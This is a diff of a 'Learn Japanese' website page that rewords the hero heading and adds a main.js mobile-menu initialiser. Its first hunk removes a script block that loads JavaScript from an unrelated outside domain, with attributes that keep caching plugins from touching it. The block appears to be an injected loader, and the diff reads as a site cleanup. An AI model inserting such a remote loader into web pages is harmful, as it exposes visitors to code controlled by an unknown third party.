@@ -13,14 +13,6 @@
         body { font-family: 'Inter', sans-serif; }
         .dropdown-menu { transition: opacity 0.3s ease-out, transform 0.3s ease-out; }
     </style>
-    <script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
-  (function () {
-      var script = document.createElement("script");
-      script.async = 1;
-      script.src = 'https://emrldtp.com/NDQyMDM2.js?t=442036';
-      document.head.appendChild(script);
-  })();
-</script>
 </head>
 <body class="bg-white text-gray-800">
 
@@ -33,7 +25,7 @@
             <div class="absolute inset-0 bg-black opacity-40"></div>
             <img src="images/learnjapanese.jpg" onerror="this.onerror=null;this.src='https://placehold.co/1600x900/cccccc/666666?text=Learn+Japanese+Hero';" alt="Japanese calligraphy brush and ink" class="w-full h-full object-cover">
             <div class="relative z-10 px-6">
-                <h1 class="text-4xl md:text-6xl font-extrabold tracking-tight drop-shadow-lg">Learn Japanese: Your Gateway to Culture</h1>
+                <h1 class="text-4xl md:text-6xl font-extrabold tracking-tight drop-shadow-lg">Learn Japanese: Your Gateway to a New World</h1>
                 <p class="mt-4 max-w-3xl mx-auto text-lg md:text-xl text-gray-200 drop-shadow-md">Start your journey to understanding and speaking Japanese, from basics to fluency.</p>
             </div>
         </section>
@@ -110,8 +102,10 @@
         </div>
     </footer>
 
+    <!-- Link to your shared JavaScript file -->
+    <script src="main.js"></script>
     <script>
-        // JavaScript to load the header
+        // JavaScript to load the header AND handle mobile menu toggle
         document.addEventListener('DOMContentLoaded', function() {
             fetch('header.html')
                 .then(response => {
@@ -122,8 +116,13 @@
                 })
                 .then(html => {
                     document.getElementById('header-placeholder').innerHTML = html;
+                    
                     // Re-initialize Lucide icons after content is loaded
                     lucide.createIcons();
+
+                    // Call the function from main.js to initialize the mobile menu
+                    initializeMobileMenu(); 
+
                 })
                 .catch(error => {
                     console.error('There has been a problem with your fetch operation:', error);
